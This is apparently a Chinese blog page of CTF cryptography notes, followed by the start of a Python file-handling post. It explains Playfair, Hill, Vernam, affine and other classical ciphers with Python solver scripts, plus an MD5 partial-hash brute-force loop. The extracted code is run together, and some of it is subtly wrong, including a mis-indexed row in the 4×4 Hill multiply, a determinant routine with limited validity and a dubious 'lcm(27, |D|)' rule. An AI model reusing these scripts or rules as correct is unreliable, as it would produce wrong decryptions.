XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;&quot;&quot;&quot;.split(&#x27;\\n&#x27;)m = [&quot;&quot;] * 13for i in range(13): for y in mtable[i]: if str.isalpha(y): m[i] += ykey = [2, 3, 7, 5, 13, 12, 9, 1, 8, 10, 4, 11, 6]message = &quot;NFQKSEVOQOFNP&quot;for i in range(len(key)): x = key[i] - 1 # key[i] - 1 while m[x][0] != message[i]: m[x] = m[x][1:] + m[x][0]for i in range(26): for j in range(len(key)): print(m[key[j] - 1][i].lower(), end=&quot;&quot;) print(&quot;\\n&quot;) Playfair密钥生成 选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将I和J视作同一字。） 数据加密 将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。最后不足两位也补X或者Q。 1、若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。 2、若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。 3、若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。 数据解密 1、若c1 c2在同一行，对应明文p1 p2分别是紧靠c1 c2 左端的字母。其中最后一列被看做是第一列的左方。 2、若c1 c2在同一列，对应明文p1 p2分别是紧靠c1 c2 上方的字母。其中最后一行被看做是第一行的上方。 3、若c1 c2不在同一行，不在同一列，则p1 p2是由c1 c2确定的矩形的其他两角的字母。 比如： 密钥crazy dog 123456789p l a y fi r b c de g h j km n o q st u v w x 明文：where there is life,there is hope. 分组：wh er et he re is li fe th er ei sh op e 加密：KU YO XD OL OY PL FK DL FU YO LG LN NG LY 解密：where there is life,there is hope python解密 123from pycipher import Playfaira&#x3D;Playfair(&#39;密文&#39;).decipher(&#39;密钥&#39;)print(a) 123from pycipher import Playfaira&#x3D;Playfair(&#39;CULTREABDFGHIKMNOPQSVWXYZ&#39;).decipher(&#39;CGOCPMOFEBMLUNISEOZY&#39;)print(a) 密钥：playfair。密文：Dncnoqqfliqrpgeklwmppu 123from pycipher import Playfaira&#x3D;Playfair(&#39;playfirbcdeghkmnoqstuvwxz&#39;).decipher(&#39;Dncnoqqfliqrpgeklwmppu&#39;)print(a) 密钥：shiyanb 密文：KQSAMFPAOPMFPA 123from pycipher import Playfaira&#x3D;Playfair(&#39;shiyanbcdefgjklmopqrtuvwx&#39;).decipher(&#39;KQSAMFPAOPMFPA&#39;)print(a) 总结： 我们在密钥生成的时候遵循将I和J视作同一字的原则，所以如果密钥中出现i或者j，就不能出现i或者j。第一个题我们是i和j都不出现，第二个题我们只出现了j，所以有些题还是要视情况而定。 密钥矩阵生成的时候可以横着写，也可以竖着写。 希尔密码原理： 希尔密码是运用基本矩阵论原理的替换密码。每个字母当作26进制数字：A=0，B=1…一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD 26。注意用作加密的矩阵（即密钥）必须是可逆的，否则就不可能译码。只有矩阵的行列式和26互质，才是可逆的。 例如：设分组长度n=2，密钥为：K={7,9；8,3}，明文为：friday 加密过程为： （1）将明文分为两两一组（因为n=2）：fr,id,ay （2）将明文字母转换为对应的明文编码：（5,17），（8,3），（0,24） （3）分别计算每一组明文对应的密文编码： 123（5,17）*K mod 26 &#x3D;（15,16）（8,3） *K mod 26&#x3D;（2,5）（0,24） *K mod 26&#x3D;（10,20） （4）将密文编码转换为对应的密文字母，即pq，cf，ku 解密过程为： （1）将密文分为两两一组：pq，cf，ku （2）将密文字母转换为对应的编码：（15,16），（2,5），（10,20） （3）分别计算每一组密文对应的明文编码（K-1位K的逆矩阵） 123（15,16）*K-1 mod 26 &#x3D;（5,17）（2,5） *K -1mod 26&#x3D;（8,3）（10,20） *K-1 mod 26&#x3D;（0,24） （4）将明文编码转换为明文字母，完成解密。 前提： 1231、密文2、矩阵（也叫解密矩阵） 步骤： 12345671、根据矩阵，求出逆矩阵。2、逆矩阵与密文对应的矩阵相乘。（一定要注意写密文矩阵的顺序）3、得到矩阵b,每一个数与26相余。4.得到的余数转ascii 例子： 密文：dloguszijluswogany 矩阵： 1231 20 1 求逆矩阵 12345678from numpy import *a3&#x3D;mat([[1,2],[0,1]])print(a3)a4&#x3D;a3.Iprint(a4)[[ 1. -2.] [ 0. 1.]] 密文转化 12d l o g u s z i j l u s w o g a n y4 12 15 7 21 19 26 9 10 12 21 19 23 15 7 1 14 25 逆矩阵与密文矩阵相乘 12345from numpy import *a=mat([[1,-2],[0,1]])b=mat([[4,15,21,26,10,21,23,7,14],[12,7,19,9,12,19,15,1,25]])c=a*bprint(c) 矩阵mod26 拿到flag 求最小公倍数 12345678910def bei(num1,num2): b = [] for i in range(1,(num1 * num2)+1): if i % num1 == 0 and i % num2 == 0: b.append(i) break return b[0]num1=int(input())num2=int(input())print(bei(num1, num2)) 如果逆矩阵得到了分数。出现分数项则 *最小公倍数(27,|D|) |D|为行列式的值。 求行列式的值 1234567891011121314151617181920212223242526272829303132333435363738def MatrixGetDet(M): length = len(M) if length == 2: return M[0][0]*M[1][1] - M[0][1]*M[1][0] import itertools # sum positive positive = 0 indexer1 = itertools.cycle(range(length)) indexer2 = itertools.cycle(range(length)) for index in range(length): indexer1.next() _tmp = 1 for index in range(length): index1 = indexer1.next() index2 = indexer2.next() _tmp *= M[index1][index2] positive += _tmp # sum negative negative = 0 indexer1 = itertools.cycle(range(length)) indexer2 = itertools.cycle(range(length)[::-1]) for index in range(length): indexer1.next() _tmp = 1 for index in range(length): index1 = indexer1.next() index2 = indexer2.next() _tmp *= M[index1][index2] negative += _tmp # return return positive - negativematrix1 = [ [1, 2, 3], [4, 5, 6], [7, 8, 10],]print MatrixGetDet(matrix1) 最终脚本 123456789101112from numpy import *dis=&#123;1:&#x27;a&#x27;,2:&#x27;b&#x27;,3:&#x27;c&#x27;,4:&#x27;d&#x27;,5:&#x27;e&#x27;,6:&#x27;f&#x27;,7:&#x27;g&#x27;,8:&#x27;h&#x27;,9:&#x27;i&#x27;,10:&#x27;j&#x27;,11:&#x27;k&#x27;,12:&#x27;l&#x27;,13:&#x27;m&#x27;,14:&#x27;n&#x27;,15:&#x27;o&#x27;,16:&#x27;p&#x27;,17:&#x27;q&#x27;,18:&#x27;r&#x27;,19:&#x27;s&#x27;,20:&#x27;t&#x27;,21:&#x27;u&#x27;,22:&#x27;v&#x27;,23:&#x27;w&#x27;,24:&#x27;x&#x27;,25:&#x27;y&#x27;,26:&#x27;z&#x27;&#125;f=mat([[8,16,27],[8,99,24],[27,24,27]])e=mat([[22,9,0],[12,3,1],[10,3,4],[8,1,17]])g=e*fflag=&quot;&quot;for i in range(4): for j in range(3): k=(g[i][j])%26+1 l=dis[k] flag+=lprint(flag) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120from numpy import *from optparse import OptionParserdef Start(): opt = OptionParser() opt.add_option(&#x27;-k&#x27;,dest=&#x27;key&#x27;,help=&quot;Input your matrix&quot;) opt.add_option(&#x27;-p&#x27;,dest=&#x27;pw&#x27;,help=&quot;Input your passwd&quot;) options,args = opt.parse_args() if options.pw is None or options.key is None: print &#x27;Use \\&#x27;-h\\&#x27; to get help&#x27; exit(0) return optionsdef ForKey(key): key = mat(key) key = key.I.T print &#x27;key is :&#x27; print key print &#x27;------------------------------------------&#x27; return keydef ForPw(pw,lenght): result = [[] for i in range(len(pw)/lenght)] for i in range(len(pw)/lenght): string = pw[i*lenght:(i+1)*lenght] for s in string: if s.isalpha(): s = ord(s) - 96 result[i].append(s) result = mat(result) print &#x27;password matrix is:&#x27; print result print &#x27;------------------------------------------&#x27; return resultdef Deal(start): key = start.key pw = start.pw if pw.isalpha(): judge = True key = ForKey(key) result = ForPw(pw,len(key)) return key,result,judgedef Exploit(key,result,judge): get = result * key print &#x27;The result matrix is:&#x27; print get print &#x27;------------------------------------------&#x27; get = array(get) string = &#x27;&#x27; for n in get: for i in n: one = int(i) while one &lt; 0: one = one + 26 one = one + 96 string = string + chr(one) print &#x27;The final result is:\\n&#x27; + stringdef main(): start = Start() key,result,judge = Deal(start) Exploit(key,result,judge)if __name__ == &#x27;__main__&#x27;: main() 123456789101112131415161718def m4mul26(m, y): return [(m[0][0]*y[0]+m[0][1]*y[1]+m[0][2]*y[2]+m[0][3]*y[3])%26, (m[1][0]*y[0]+m[1][1]*y[1]+m[1][2]*y[2]+m[1][3]*y[3])%26, (m[2][0]*y[0]+m[2][1]*y[1]+m[2][2]*y[2]+m[2][3]*y[3])%26, (m[2][0]*y[0]+m[3][1]*y[1]+m[3][2]*y[2]+m[3][3]*y[3])%26,]dic &#x3D; &#39;abcdefghijklmnopqrstuvwxyz&#39;b &#x3D; [[1, -1, 0, 0], [0, 1, -1, 0], [0, 0, 1, -1], [0, 0, 0, 1]]c &#x3D; &#39;kdptxjveinjsqmmapwfx&#39;m &#x3D; &#39;&#39;for i in xrange(0,len(c),4): test &#x3D; [dic.index(c[i]),dic.index(c[i+1]),dic.index(c[i+2]),dic.index(c[i+3])] res &#x3D; m4mul26(b,test) m &#x3D; m + dic[res[0]] + dic[res[1]] + dic[res[2]] + dic[res[3]]print m 总结： 1.在转换逆矩阵的时候，如果出现了分数或者小数。我们需要将逆矩阵乘以27和d(给我们的矩阵的行列式)的最小公倍数。 2.加密矩阵如果是 2 × 2 的方阵，明文就要每两个为列，组成 2 × n 的矩阵。 德军密码([费娜姆密码])12345678910111213141516171819202122232425262728293031323334353637383940414243444546EnCODE &#x3D;&#123;&#39;A&#39;:&#39;1000001&#39; ,&#39;N&#39;:&#39;1001110&#39;, &#39;B&#39;: &#39;1000010&#39;, &#39;O&#39; :&#39;1001111&#39;, &#39;C&#39;: &#39;1000011&#39;, &#39;P&#39; :&#39;1010000&#39;, &#39;D&#39;: &#39;1000100&#39;, &#39;Q&#39; :&#39;1010001&#39;, &#39;E&#39;: &#39;1000101&#39;, &#39;R&#39; :&#39;1010010&#39;, &#39;F&#39;: &#39;1000110&#39;, &#39;S&#39; :&#39;1010011&#39;, &#39;G&#39;: &#39;1000111&#39;, &#39;T&#39; :&#39;1010100&#39;, &#39;H&#39;: &#39;1001000&#39;, &#39;U&#39; :&#39;1010101&#39;, &#39;I&#39;: &#39;1001001&#39;, &#39;V&#39; :&#39;1010110&#39;, &#39;J&#39;: &#39;1001010&#39;, &#39;W&#39; :&#39;1010111&#39;, &#39;K&#39;: &#39;1001011&#39; ,&#39;X&#39; :&#39;1011000&#39;, &#39;L&#39;: &#39;1001100&#39; ,&#39;Y&#39; :&#39;1011001&#39;, &#39;M&#39;: &#39;1001101&#39; ,&#39;Z&#39; :&#39;1011010&#39;&#125;DeCODE&#x3D;&#123; &#39;1000001&#39;:&#39;A&#39;, &#39;1001110&#39;:&#39;N&#39;, &#39;1000010&#39;:&#39;B&#39;, &#39;1001111&#39;:&#39;O&#39;, &#39;1000011&#39;:&#39;C&#39;, &#39;1010000&#39;:&#39;P&#39;, &#39;1000100&#39;:&#39;D&#39;, &#39;1010001&#39;:&#39;Q&#39;, &#39;1000101&#39;:&#39;E&#39;, &#39;1010010&#39;:&#39;R&#39;, &#39;1000110&#39;:&#39;F&#39;, &#39;1010011&#39;:&#39;S&#39;, &#39;1000111&#39;:&#39;G&#39;, &#39;1010100&#39;:&#39;T&#39;, &#39;1001000&#39;:&#39;H&#39;, &#39;1010101&#39;:&#39;U&#39;, &#39;1001001&#39;:&#39;I&#39;, &#39;1010110&#39;:&#39;V&#39;, &#39;1001010&#39;:&#39;J&#39;, &#39;1010111&#39;:&#39;W&#39;, &#39;1001011&#39;:&#39;K&#39;, &#39;1011000&#39;:&#39;X&#39;, &#39;1001100&#39;:&#39;L&#39;, &#39;1011001&#39;:&#39;Y&#39;, &#39;1001101&#39;:&#39;M&#39;, &#39;1011010&#39;:&#39;Z&#39;&#125;steady_str&#x3D;&quot;00000100001000001101000001100001010&quot;steady_key&#x3D;&quot;large&quot;.upper()steady_new_key&#x3D;&quot;&quot;flag&#x3D;&quot;&quot;for i in steady_key: steady_new_key+&#x3D;EnCODE[i]for j in range(0,len(steady_str),7): inting&#x3D;&quot;&quot; string&#x3D;str(steady_str[j:j+7]) string1&#x3D;str(steady_new_key[j:j+7]) for z in range(7): inting+&#x3D;str(int(string[z])^int(string1[z])) try: flag+&#x3D;DeCODE[inting] except: passprint(flag) 123456789101112131415161718192021#费纳姆密码解密脚本cipher &#x3D; input(&quot;请输入密文：&quot;)key &#x3D; input(&quot;请输入密钥：&quot;)miyao &#x3D; &quot;&quot;flag1 &#x3D; &quot;&quot;final &#x3D; &quot;&quot;for i in key: miyao +&#x3D; (str(bin(ord(i)))[2:])print(miyao)for i in range(len(cipher)): flag1 +&#x3D; str(int(cipher[i])^int(miyao[i]))#flag七个一组进行分割print(cipher)step &#x3D; 7b &#x3D; [flag1[i:i+step] for i in range(0,len(flag1),step)]flag &#x3D; []for i in b: flag.append(i)for i in flag: final +&#x3D; chr(int(i,2))print(&quot;flag为：&quot;+final) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162transform1 = &#123;&#x27;1000001&#x27;:&#x27;A&#x27;,&#x27;1000010&#x27;:&#x27;B&#x27;, &#x27;1000011&#x27;:&#x27;C&#x27;,&#x27;1000100&#x27;:&#x27;D&#x27;, &#x27;1000101&#x27;:&#x27;E&#x27;,&#x27;1000110&#x27;:&#x27;F&#x27;, &#x27;1000111&#x27;:&#x27;G&#x27;,&#x27;1001000&#x27;:&#x27;H&#x27;, &#x27;1001001&#x27;:&#x27;I&#x27;,&#x27;1001010&#x27;:&#x27;J&#x27;, &#x27;1001011&#x27;:&#x27;K&#x27;,&#x27;1001100&#x27;:&#x27;L&#x27;, &#x27;1001101&#x27;:&#x27;M&#x27;,&#x27;1001110&#x27;:&#x27;N&#x27;, &#x27;1001111&#x27;:&#x27;O&#x27;,&#x27;1010000&#x27;:&#x27;P&#x27;, &#x27;1010001&#x27;:&#x27;Q&#x27;,&#x27;1010010&#x27;:&#x27;R&#x27;, &#x27;1010011&#x27;:&#x27;S&#x27;,&#x27;1010100&#x27;:&#x27;T&#x27;, &#x27;1010101&#x27;:&#x27;U&#x27;,&#x27;1010110&#x27;:&#x27;V&#x27;, &#x27;1010111&#x27;:&#x27;W&#x27;,&#x27;1011000&#x27;:&#x27;X&#x27;, &#x27;1011001&#x27;:&#x27;Y&#x27;,&#x27;1011010&#x27;:&#x27;Z&#x27;&#125; #反转字典,方便将key进行编码transform2 = &#123;value:key for key,value in transform1.items()&#125; cipher = &#x27;0000011000000000101010110111001011000101100000111001100100111100111001&#x27; key = &#x27;helloworld&#x27;#将字母转换成01字符串def trans1(key): list2 = [] for item in key.upper(): list2.append(transform2[item]) return list2#将01字符串分割def trans2(cipher): num = 0 result = [] plain = &#x27;&#x27; while True: result.append(cipher[num:num+7]) num += 7 if(num &gt; len(cipher)-7): break return result#自定义异或操作def XOR(text,keynew): result = &#x27;&#x27; for i in range(0,len(text)): if text[i] == keynew[i]: result += &#x27;0&#x27; else : result += &#x27;1&#x27; return result if __name__ == &#x27;__main__&#x27;: key1 = trans1(key) cipher1 = trans2(cipher) key2 = &#x27;&#x27;.join(key1) cipher2 = &#x27;&#x27;.join(cipher1) result = XOR(key2,cipher2) result1 = trans2(result) result2 =&#x27;&#x27; for i in result1: if i not in transform1: result2 += &#x27; &#x27; else: result2 += transform1[i] print result2 MD5MD5,全称Message Digest Algorithm 5，翻译过来就是消息摘要算法第5版，是计算机安全领域广泛使用的一种散列函数，用于确保信息传输的完整性。MD5算法是由MD2、MD3、MD4演变而来，是一种单向加密算法，一种不可逆的加密方式。 经过MD5加密后其MD5值长度都是固定的。MD5值长度固定为128位，而最后的值一般都用16进制数字表示，一个16进制数字占4位，所以最后的MD5值都是用32个16进制数字表示。 python-MD5加密 1234import hashlib md5 &#x3D; hashlib.md5()md5.update(&#39;how to user md5 in python hashlib?&#39;.encode(&#39;utf-8&#39;))print(md5.hexdigest()) 常见爆破脚本 12345678910111213import stringimport hashliba=&#x27;TASC?O3RJMV?WDJKX?ZM&#x27;b=&#x27;e9032???da???08????911513?0???a2&#x27;dic1=string.digits+string.ascii_lowercase+string.ascii_uppercasefor i in dic1: for j in dic1: for x in dic1: a=&#x27;TASC&#x27;+i+&#x27;O3RJMV&#x27;+j+&#x27;WDJKX&#x27;+x+&#x27;ZM&#x27; steady_str=hashlib.md5(a) steady_str=steady_str.hexdigest() if steady_str[:5]==b[:5]: print(a) 曼切斯特编码和差分曼切斯特编码曼彻斯特编码（Manchester Encoding），也叫做相位编码（ Phase Encode，简写PE），是一个同步时钟编码技术，被物理层使用来编码一个同步位流的时钟和数据。 曼彻斯特编码 曼彻斯特编码表示0或1有两种不同的方法：第一种G. E. Thomas, Andrew S. Tanenbaum1949年提出的，它规定0是由低-高的电平跳变表示，1是高-低的电平跳变。按此规则有： 1234编码0101（0x5）表示为00； 编码1001（0x9）表示10； 编码0110（0x6）表示01； 编码1010（0xA）表示11。 第二种IEEE 802.4（令牌总线）和低速版的IEEE 802.3（以太网）中规定, 按照这样的说法, 低-高电平跳变表示1, 高-低的电平跳变表示0。 1234编码0101（0x5）表示11； 编码1001（0x9）表示01； 编码0110（0x6）表示10； 编码1010（0xA）表示00； 差分曼切斯特编码 123每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示&quot;0&quot;或&quot;1&quot;，有跳变为&quot;0&quot;，无跳变为&quot;1&quot;。即:0-1 跳变表示 1,1-0 跳变表示 0 第一种编码情况： 123456789101112131415161718192021#拿到编码，先转换二进制，然后根据编码规则转换成二进制，然后二进制转换字符串或者十六进制。要注意转换之后二进制的长度是否要补充0#最终直接转化字符串，一定要注意二进制数据是四的倍数。a=&quot;5555555595555A65556AA696AA6666666955&quot;b=int(a,16)c=&#x27;0&#x27;+bin(b)[2:]print(&quot;转换成二进制为:&quot;+c)flag=&quot;&quot;steady_flag=&quot;&quot;for i in range(0,len(c),4): steady=c[i:i+4] if steady==&#x27;0101&#x27;: flag+=str(&#x27;00&#x27;) elif steady==&#x27;1001&#x27;: flag+=str(&#x27;10&#x27;) elif steady==&#x27;0110&#x27;: flag+=str(&#x27;01&#x27;) elif steady==&#x27;1010&#x27;: flag+=str(&#x27;11&#x27;)print(&quot;转化之后的二进制为:&quot;+flag)print(hex(int(flag,2)))#采用第二种编码方式，并且需要将二进制数据每八位逆序。然后转换十六进制。 第二种编码情况： 1234567891011121314151617181920#拿到编码，先转换二进制，然后根据编码规则转换成二进制，然后二进制转换字符串或者十六进制。要注意转换之后二进制的长度是否要补充0#最终直接转化字符串，一定要注意二进制数据是四的倍数。a=&quot;5555555595555A65556AA696AA6666666955&quot;b=int(a,16)c=&#x27;0&#x27;+bin(b)[2:]print(&quot;转换成二进制为:&quot;+c)flag=&quot;&quot;steady_flag=&quot;&quot;for i in range(0,len(c),4): steady=c[i:i+4] if steady==&#x27;0101&#x27;: flag+=str(&#x27;11&#x27;) elif steady==&#x27;1001&#x27;: flag+=str(&#x27;01&#x27;) elif steady==&#x27;0110&#x27;: flag+=str(&#x27;10&#x27;) elif steady==&#x27;1010&#x27;: flag+=str(&#x27;00&#x27;)print(&quot;转化之后的二进制为:&quot;+flag)#采用第二种编码方式，并且需要将二进制数据每八位逆序。然后转换十六进制。 仿设加密affine单码加密法的另一种形式称为仿射加密法（affine cipher）。在仿射加密法中，字母表的字母被赋予一个数字，例如a=0，b=1，c=2…z=25。仿射加密法的密钥为0-25直接的数字对。 含义 仿射加密法与单码加密法没什么不同，因为明文的每个字母分别只映射到一个密文字母。仿射密码的加密算法就是一个线性变换，即对任意的明文字符x，对应的密文字符为 ， 其中，a,b∈Z26，且要求gcd(a,26)=1,函数e(x)称为仿射加密函数。 gcd(a,b)表示非负整数a,b的最大公因数 加密函数是 E(x)=(ax+b)(modm) x表示明文按照某种编码得到的数字a和 m互质m是编码系统中字母的数目。 解密函数是 D(x)=a−1(x−b)(modm) a−1 是 a 在 Zm群的乘法逆元。 乘法逆元 举例 下面我们以 E(x)=(5x+8)mod26函数为例子进行介绍，加密字符串为 AFFINE CIPHER， 这里我们直接采用字母表26个字母作为编码系统 其对应的加密结果是 IHHWVCSWFRCP。 对于解密过程，正常解密者具有a与b，可以计算得到 a−1为 21， 所以其解密函数是D(x)=21(x−8)(mod26) 解密如下 实战bugku affine 123y &#x3D; 17*x-8 flag&#123;szzyfimhyzd&#125; 答案格式：flag&#123;********&#125; 给了密文，加密函数。我们需要做的是解出解密函数。解密函数是 D(x)=a−1(x−b)(modm)所以我们要的明文就是，明文=a-1*（x+8）mod 26我们提到过a-1是a的乘法逆元(是a的负一次方)。a=17，所以他的乘法逆元就是23。解密函数为：23*(x+8) mod 26上脚本： 123456789import string #affine s = &#x27;szzyfimhyzd&#x27;s1 = &#x27;&#x27;len =len(s)for i in range(0,len): a=(23*(ord(s[i])-97+8))%26 s1+=chr(a+97)print s1 脚本解释：1.x表示明文按照某种编码得到的数字。即a为0，b为1，以此类推。我们在进行python解密的时候x必须要是数字，而且还是要对应某种编码 的数字。python中ord可以将字母转化为对应的十进制ascii，而a的ascii为97。所以这就是为什么要减去97。后面加上97是为了转换为字母。 求逆元的python脚本： 12345678910111213141516171819202122232425262728293031323334353637383940#欧几里德算法求最大公约数def get_gcd(a, b): k = a // b remainder = a % b while remainder != 0: a = b b = remainder k = a // b remainder = a % b return b #改进欧几里得算法求线性方程的x与ydef get_(a, b): if b == 0: return 1, 0 else: k = a // b remainder = a % b x1, y1 = get_(b, remainder) x, y = y1, x1 - k * y1 return x, y a = input(&#x27;a:&#x27;)b = input(&#x27;b:&#x27;)a, b = int(a), int(b) #将初始b的绝对值进行保存if b &lt; 0: m = abs(b)else: m = bflag = get_gcd(a, b) #判断最大公约数是否为1，若不是则没有逆元if flag == 1: x, y = get_(a, b) x0 = x % m #对于Python &#x27;%&#x27;就是求模运算，因此不需要&#x27;+m&#x27; print(&quot;所求的逆元:&quot;,x0) #x0就是所求的逆元else: print(&quot;Do not have!&quot;) BUUctf e(x)=11x+6(mod26) 密文：welcylk 其中给出加密函数，a的逆元是11，所以a为19，b=6，所以构造脚本。 12345678910import string #affineimport base64 s = &#x27;welcylk&#x27;s1 = &#x27;&#x27;len =len(s)for i in range(0,len): a=(19*(ord(s[i])-97-6))%26 s1+=chr(a+97)print(base64.b64encode(s1))# a=(a的逆元*(ord(s[i])-97-b))%26 暴力破解脚本(a未知)： 12345678910str1=&#x27;achjbnpdfherebjsw&#x27;b=[1,9,21,15,3,19,7,23,11,5,17,25]flag=&#x27;&#x27;for j in b: for i in range(len(str1)): a=(j*(ord(str1[i])-97-7))%26 flag+=chr(a+97) print(&#x27;\\n&#x27;) print(flag) flag=&#x27;&#x27; 暴力破解脚本(a、b均未知)： 1234567891011121314import base64cipher = &#x27;SElWTVVSQ1FXUUlXVUhFVg==&#x27;plain1 = base64.b64decode(cipher) dict = [1,3,5,7,9,11,15,17,19,21,23,25] plain2 = plain1.lower() for a in dict: for b in range(26): plain3 = &#x27;&#x27; for item in plain2: plain3 += chr((a*(ord(item)-97)+b)%26+97) print plain3 手机密码123456strr = &quot;ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee&quot;.split()all = &#123;&#x27;none1&#x27;:&#x27;&#x27;,&#x27;none2&#x27;:&#x27;&#x27;,&#x27;w&#x27;:&#x27;abc&#x27;,&#x27;e&#x27;:&#x27;def&#x27;,&#x27;r&#x27;:&#x27;ghi&#x27;,&#x27;t&#x27;:&#x27;jkl&#x27;,&#x27;y&#x27;:&#x27;mno&#x27;,&#x27;u&#x27;:&#x27;pors&#x27;,&#x27;i&#x27;:&#x27;tuv&#x27;,&#x27;o&#x27;:&#x27;wxyz&#x27;&#125;flag=&quot;&quot;for i in strr: flag+=all[i[0]][len(i)-1]print(flag)","categories":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"}],"tags":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"}]},{"title":"Python学习--Python文件操作","slug":"Python文件操作","date":"2018-12-01T19:22:45.000Z","updated":"2020-11-10T02:31:20.196Z","comments":true,"path":"2018/12/02/Python文件操作/","link":"","permalink":"http://s1eady.top/2018/12/02/Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","excerpt":"","text":"Python文件操作Python中文件数据的读和写open()方法两个参数mode(模式)和encoding(编码)。 encoding一般来说，打开文件的编码方式以操作系统的默认编码为准，中文可能会出现乱码，需要加encoding=’utf-8’，windows默认gbk，linux默认utf-8，mac默认utf-8。 123with open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.txt&#39;,&#39;r&#39;,encoding&#x3D;&#39;utf-8&#39;) as fp: a&#x3D;fp.readlines() print(a) mode，它指定文件打开的模式，对于非文本文件，我们只能使用b模式。注：以b方式打开时，读取到的内容是字节类型，写入时也需要提供字节类型，不能指定编码。 关于r+模式：打开一个文件用于读写，文件指针默认将会放在文件的开头。注意：如果在读写模式下，先写后读，那么文件就会出问题，因为默认光标是在文件的最开始，你要是先写，则写入的内容会将原内容覆盖掉，直到覆盖到你写完的内容，然后在从后面开始读取。 12345678910111213141516 &#39;r&#39;： 以只读模式打开（缺省模式，必须保证文件存在） &#39;w&#39;：以只写模式打开。若文件存在，则清空文件，然后重新创建；若不存在，则新建 &#39;a&#39;：以追加模式打开。若文件存在，则会追加到文件的末尾；若文件不存在，则新建 常见的mode组合 &#39;r&#39;或&#39;rt&#39;： 默认模式，文本读模式 &#39;w&#39;或&#39;wt&#39;：以文本写模式打开（打开前文件被清空） &#39;rb&#39;： 以二进制读模式打开 &#39;ab&#39;： 以二进制追加模式打开 &#39;wb&#39;： 以二进制写模式打开（打开前文件被清空） &#39;r+&#39;： 以文本读写模式打开，默认写的指针开始指在文件开头, 因此会覆写文件 &#39;w+&#39;： 以文本读写模式打开（打开前文件被清空） &#39;a+&#39;： 以文本读写模式打开（只能写在文件末尾） &#39;rb+&#39;： 以二进制读写模式打开 &#39;wb+&#39;： 以二进制读写模式打开（打开前被清空）&#39;ab+&#39;： 以二进制读写模式打开 with open()优点 优点1：不用手动关闭文件句柄。 优点2：一个语句可以操作多个文件句柄。 两个函数tell() 方法用来显示当前指针的位置。 seek(offset,whence)方法用来重新设定指针的位置。 offset:表示偏移量 whence:只能传入012中的一个数字。 0表示从文件头开始 1表示从当前位置开始 2 表示从文件的末尾开始 读文件123with open(&#39;data.txt&#39;, &#39;r&#39;) as f: data &#x3D; f.read() print(&#39;context: &#123;&#125;&#39;.format(data)) file.read([size])从文件读取指定的字节数，如果未给定或为负则读取所有。 file.readline([size])读取整行，包括 “\\n” 字符，readline()读取第一行就返回，再次调用f.readline()，会读取下一行。 file.readlines([sizeint]) 常与for循环和strip()去掉换行符配合。 读取所有行并返回列表，若给定sizeint&gt;0，则是设置一次读多少字节，这是为了减轻读取压力。 12345678910111213141516171819202122232425262728In [47]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: print(f.read())1 is everything.python is a cat.this is the end.In [48]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: print(f.readlines())[&#x27;1 is everything.\\n&#x27;, &#x27;python is a cat.\\n&#x27;, &#x27;this is the end.&#x27;]In [49]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: print(f.readline())1 is everything.In [61]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: for line in f.readlines(): ...: print(line)1 is everything.python is a cat.this is the end.# 读取内容包含换行符，所以要strip()去掉换行符In [62]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: for line in f.readlines(): ...: print(line.strip())1 is everything.python is a cat.this is the end. 写文件123with open(&#39;data.txt&#39;, &#39;w&#39;) as f: data &#x3D; &#39;some data to be written to the file&#39; f.write(data) 获取目录列表os.scandir()os.scandir() 调用时返回一个迭代器而不是一个列表。 1234import osentries &#x3D; os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)print(entries)# &lt;posix.ScandirIterator at 0x105b4d4b0&gt; ScandirIterator 指向了当前目录中的所有条目。你可以遍历迭代器的内容，并打印文件名。 1234import oswith os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;) as entries: for entry in entries: print(entry.name) 12345678910111213141516171819202122➜ Desktop python3 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py.DS_Store阅读笔记.md.localized常用操作huazhu.com.csvhuazhu_url.txtcodesteady-learnvulhub-master未命名 2.txtPHP木马.mdjava基础.md1.pymakedownSQL server.md开发学习sqlmap使用以及学习.mdSQL注入漏洞挖掘.mdIPC.mdPython爬虫.md漏洞盒子 这里 os.scandir() 和with语句一起使用，因为它支持上下文管理协议。使用上下文管理器关闭迭代器并在迭代器耗尽后自动释放获取的资源。 pathlib获取目录列表的方法是使用 pathlib 模块： 12345from pathlib import Pathentries &#x3D; 